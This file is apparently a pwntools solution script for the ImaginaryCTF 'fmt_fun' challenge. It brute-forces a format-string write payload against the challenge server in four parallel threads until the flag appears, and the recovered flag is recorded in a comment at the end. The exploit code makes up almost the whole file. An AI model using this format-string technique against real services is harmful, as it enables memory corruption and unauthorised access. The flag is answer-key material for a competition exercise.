from pwn import *
import os

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

# elf = ELF('./fmt_fun')
# libc = ELF('./libc.so.6')

# io = gdb.debug('./fmt_fun', 'b *(main+143)\nc', env={'LD_PRELOAD': './libc.so.6'})
# io = gdb.debug('./fmt_fun', 'b *(main+143)\nc')
# io.sendline(b'%c%c%c%c%c%c%c%c%hn%1$78c%37$hhn')
# io.interactive()

def brute():
    context.log_level = 'error'
    while True:
        # io = process('./fmt_fun', env={'LD_PRELOAD': './libc.so.6'})
        io = remote("fmt-fun.chal.imaginaryctf.org", 1337)
        io.sendline(b'%c%c%c%c%c%c%c%c%hn%1$78c%37$hhn')
        x = io.recvall()
        print(x)
        if b'ictf' in x:
            os._exit(0)
        io.close()

from threading import Thread

for _ in range(4):
    Thread(target=brute).start()
# ictf{n0t_imp0ssibl3?_1b06af92}
